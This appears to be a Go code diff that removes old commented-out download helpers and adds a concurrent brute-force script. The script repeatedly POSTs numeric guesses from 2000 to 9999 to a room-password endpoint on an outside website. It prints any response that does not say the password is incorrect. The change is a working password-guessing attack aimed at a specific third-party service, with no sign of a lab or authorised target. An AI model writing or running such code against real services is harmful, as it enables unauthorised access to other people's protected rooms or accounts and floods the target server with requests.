@@ -1,79 +1,61 @@
 package main
 
 import (
-	"cloud/env"
 	"fmt"
 	"io/ioutil"
 	"log"
 	"net/http"
+	"net/url"
+	"strings"
+
+	"github.com/nlh1996/utils"
 )
 
-// var buffer []byte
+var u string
 
-func main() {
-	// bs := []byte("hello|wor|ld")
-	// i := bytes.Index(bs, []byte("|"))
-	// fmt.Println(string(bs[:i]))
-	// r := fmt.Sprintf("%v-%v", 100000000*(1-1), 100000000*1)
-	// fmt.Println(r)
-	// var buffer bytes.Buffer
-	// buffer.WriteString("你好")
-	// buffer.WriteString("hi")
-	// fmt.Println(buffer.String())
-	// buffer.WriteString(" ccc")
-	// fmt.Println(buffer.String())
+func init() {
+	u = "http://h5.u6686z.cn/html/isroompwd.php?roomnumber=23314391"
 }
 
-// func getRes(url string, i int, size int) string {
-// 	req, err := http.NewRequest("GET", url, nil)
-// 	if err != nil {
-// 		log.Fatalf("Invalid url for downloading: %s, error: %v", url, err)
-// 	}
-// 	s := fmt.Sprintf("bytes=%d-%d", i*size, (i+1)*size)
-// 	req.Header.Set("Range", s)
-// 	req.Header.Set("Accept-Charset", "utf-8")
-// 	resp, err := env.Client.Do(req)
-// 	if err != nil {
-// 		log.Println(err)
-// 		return ""
-// 	}
-// 	var res string
-// 	for {
-// 		n, err := resp.Body.Read(buffer)
-// 		if err != nil || n == 0 {
-// 			fmt.Println("出现错误")
-// 			break
-// 		}
-// 		res += string(buffer[:n])
-// 	}
-// 	if resp != nil {
-// 		resp.Body.Close()
-// 	}
-// 	return res
-// }
+func main() {
 
-// func getRes2(url string, i int, size int) string {
-// 	req, err := http.NewRequest("GET", url, nil)
-// 	if err != nil {
-// 		log.Fatalf("Invalid url for downloading: %s, error: %v", url, err)
-// 	}
-// 	s := fmt.Sprintf("bytes=%d-%d", i*size, (i+1)*size)
-// 	req.Header.Set("Range", s)
-// 	req.Header.Set("Accept-Charset", "utf-8")
-// 	resp, err := env.Client.Do(req)
-// 	if err != nil {
-// 		log.Println(err)
-// 		return ""
-// 	}
-// 	body, err := ioutil.ReadAll(resp.Body)
-// 	if err != nil {
-// 		log.Println(err)
-// 	}
-// 	if resp != nil {
-// 		resp.Body.Close()
-// 	}
-// 	return string(body)
-// }
+	for i := 2; i < 10; i++ {
+		go ccc(i)
+	}
+	select {}
+}
+
+func ccc(index int) {
+	for i := index * 1000; i < (index+1)*1000; i++ {
+		getRes2(u, i)
+	}
+	fmt.Println("stop")
+}
+
+func getRes2(u string, i int) {
+	s := utils.IntToString(i)
+	DataURLVal := url.Values{}
+	DataURLVal.Add("room_config_pwd", s)
+
+	resp, err := http.Post(u,
+		"application/x-www-form-urlencoded",
+		strings.NewReader(DataURLVal.Encode()))
+	if err != nil {
+		log.Println(err)
+	}
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		log.Println(err)
+	}
+	if resp != nil {
+		resp.Body.Close()
+	}
+	if strings.Contains(string(body), "密码不正确") {
+		return
+	}
+	fmt.Println(s, string(body))
+}
 
 // func testStrings() {
 // 	var str = "Hello world!!!"
@@ -150,23 +132,23 @@ func main() {
 // 	return string(resp.Body())
 // }
 
-func getRes(url string, i int, size int) string {
-	req, err := http.NewRequest("GET", url, nil)
-	if err != nil {
-		log.Fatalf("Invalid url for downloading: %s, error: %v", url, err)
-	}
-	s := fmt.Sprintf("bytes=%d-%d", i*size, (i+1)*size)
-	req.Header.Set("Range", s)
-	req.Header.Set("Accept-Charset", "utf-8")
-	req.Header.Set("Accept-Encoding", "gzip")
-	resp, err := env.Client.Do(req)
-	if err != nil {
-		log.Println(err)
-		return ""
-	}
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Println(err)
-	}
-	return string(body)
-}
+// func getRes(url string, i int, size int) string {
+// 	req, err := http.NewRequest("GET", url, nil)
+// 	if err != nil {
+// 		log.Fatalf("Invalid url for downloading: %s, error: %v", url, err)
+// 	}
+// 	s := fmt.Sprintf("bytes=%d-%d", i*size, (i+1)*size)
+// 	req.Header.Set("Range", s)
+// 	req.Header.Set("Accept-Charset", "utf-8")
+// 	req.Header.Set("Accept-Encoding", "gzip")
+// 	resp, err := env.Client.Do(req)
+// 	if err != nil {
+// 		log.Println(err)
+// 		return ""
+// 	}
+// 	body, err := ioutil.ReadAll(resp.Body)
+// 	if err != nil {
+// 		log.Println(err)
+// 	}
+// 	return string(body)
+// }
